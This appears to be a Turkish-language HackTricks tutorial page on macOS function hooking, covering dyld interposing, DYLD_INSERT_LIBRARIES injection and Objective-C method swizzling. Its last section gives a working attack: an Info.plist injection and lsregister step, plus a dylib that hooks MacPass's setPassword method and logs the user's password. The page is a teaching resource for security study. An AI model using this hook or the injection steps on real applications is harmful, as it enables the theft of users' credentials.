# macOS Fonksiyon Hooking

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 **Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek **hackleme püf noktalarını paylaşın**.

</details>
{% endhint %}

## Fonksiyon Interposing

**`__interpose` (`__DATA___interpose`)** bölümü olan bir **dylib** oluşturun (veya **`S_INTERPOSING`** ile işaretlenmiş bir bölüm) ve **orijinal** ve **yerine geçen** fonksiyonlara işaret eden **fonksiyon işaretçileri** tuple'larını içerir.

Ardından, **dylib'i** **`DYLD_INSERT_LIBRARIES`** ile **enjekte edin** (interposing, ana uygulama yüklenmeden önce gerçekleşmelidir). Açıkçası [**`DYLD_INSERT_LIBRARIES`** kullanımına uygulanan **kısıtlamalar** burada da geçerlidir](macos-library-injection/#check-restrictions).

### printf'i Interpose Edin

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
**`DYLD_PRINT_INTERPOSTING`** çevresel değişkeni, araya girme işlemini hata ayıklamak için kullanılabilir ve araya girme işlemini yazdırır.
{% endhint %}

Ayrıca **araya girme işleminin işlem ve yüklenen kütüphaneler arasında gerçekleştiğini** unutmayın, paylaşılan kütüphane önbelleği ile çalışmaz.

### Dinamik Araya Girme

Artık bir işlevi dinamik olarak **`dyld_dynamic_interpose`** işlevini kullanarak araya girmek de mümkündür. Bu, bir işlevi çalışma zamanında programatik olarak araya girmeyi sağlar, sadece başlangıçtan değil.

Yerine getirilecek işlev ve yerine geçecek işlevin **demetlerini** belirtmek yeterlidir.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Yöntem Değiştirme

ObjectiveC'de bir yöntem şu şekilde çağrılır: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**Nesne**, **yöntem** ve **parametreler** gereklidir. Bir yöntem çağrıldığında bir **mesaj gönderilir** ve **`objc_msgSend`** fonksiyonu kullanılır: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Nesne **`someObject`**, yöntem **`@selector(method1p1:p2:)`** ve argümanlar **value1**, **value2**'dir.

Nesne yapıları takip edilerek, **yöntemlerin bir dizisine** ulaşmak mümkündür, burada **isimler** ve **yöntem kodunun işaretçileri** bulunmaktadır.

{% hint style="danger" %}
Yöntemler ve sınıflar isimlerine göre erişildiği için bu bilgi ikili dosyada saklanır, bu yüzden `otool -ov </path/bin>` veya [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ile geri alınabilir.
{% endhint %}

### Ham yöntemlere erişim

Yöntemlerin adı, parametre sayısı veya adresi gibi bilgilere aşağıdaki örnekte olduğu gibi erişmek mümkündür:

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### method_exchangeImplementations ile Method Swizzling

**`method_exchangeImplementations`** fonksiyonu, **bir fonksiyonun uygulamasının adresini diğer bir fonksiyon için değiştirmeyi** sağlar.

{% hint style="danger" %}
Bu nedenle bir fonksiyon çağrıldığında **çalıştırılan diğer fonksiyondur**.
{% endhint %}

{% endcode %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
Bu durumda, **meşru** yöntemin **uygulama kodu** **yöntem adını doğrularsa**, bu swizzling'i **algılayabilir** ve çalışmasını engelleyebilir.

Aşağıdaki teknikte bu kısıtlama bulunmamaktadır.
{% endhint %}

### method\_setImplementation ile Yöntem Swizzling

Önceki format garip çünkü 2 yöntemin birbirinin uygulamasını değiştiriyorsunuz. **`method_setImplementation`** fonksiyonunu kullanarak bir **yöntemin uygulamasını diğerine değiştirebilirsiniz**.

Yeni uygulamadan eski uygulamayı çağırmayı düşünüyorsanız, **orijinalinin uygulamasının adresini sakladığınızdan emin olun**, çünkü daha sonra o adresi bulmak çok daha karmaşık hale gelecektir.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## Hooking Saldırı Metodolojisi

Bu sayfada fonksiyonları hook etmenin farklı yolları tartışıldı. Bununla birlikte, bunlar **saldırmak için işlem içinde kod çalıştırmayı** içeriyordu.

Bunu yapabilmek için kullanılacak en kolay teknik, bir [Dyld aracılığıyla çevresel değişkenler veya ele geçirme](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md) yoluyla enjekte etmektir. Bununla birlikte, bunun aynı zamanda [Dylib işlem enjeksiyonu](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) yoluyla da yapılabilmesi mümkün olabilir.

Ancak, her iki seçenek de **korumasız** ikili işlemlerle sınırlıdır. Sınırlamalar hakkında daha fazla bilgi edinmek için her tekniği kontrol edin.

Ancak, bir fonksiyon hooklama saldırısı çok spesifiktir, bir saldırgan bunu yaparak **bir işlem içinden hassas bilgileri çalmayı** amaçlar (aksi takdirde bir işlem enjeksiyon saldırısı yapardınız). Ve bu hassas bilgiler, MacPass gibi kullanıcı tarafından indirilen Uygulamalarda bulunabilir.

Bu nedenle, saldırgan vektörü ya bir zafiyet bulacak ya da uygulamanın imzasını kaldıracak, uygulamanın Info.plist dosyası aracılığıyla **`DYLD_INSERT_LIBRARIES`** çevresel değişkenini enjekte edecek ve şuna benzer bir şey ekleyecektir:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
ve ardından uygulamayı **yeniden kaydedin**:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

O kütüphaneye bilgileri dışarı çıkarmak için kancalama kodunu ekleyin: Şifreler, mesajlar...

{% hint style="danger" %}
Yeni macOS sürümlerinde, uygulama ikili dosyasının imzasını **kaldırırsanız** ve önceden çalıştırıldıysa, macOS artık uygulamayı **çalıştırmayacak**.
{% endhint %}

#### Kütüphane örneği

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## Referanslar

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
